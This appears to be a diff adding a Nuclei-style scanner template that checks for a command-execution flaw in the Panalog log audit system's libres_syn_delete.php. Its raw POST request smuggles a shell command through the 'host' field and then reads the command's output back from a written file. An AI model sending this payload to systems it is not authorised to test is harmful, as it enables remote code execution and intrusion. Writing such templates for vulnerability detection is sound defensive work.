@@ -1,0 +1,34 @@
+id: Panalog-libres_syn_delete-rce
+
+info:
+  name: Panalog大数据日志审计系统libres_syn_delete.php存在命令执行漏洞
+  author: Panalog
+  severity: critical
+  tags: Panalog
+
+
+http:
+  - raw:
+      - |
+        POST /content-apply/libres_syn_delete.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        token=1&id=2&host=|id >36d9spelormisf.txt
+
+      - |+
+        GET /content-apply/36d9spelormisf.txt HTTP/1.1
+        Host:{{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+      - type: status
+        status:
+          - 200
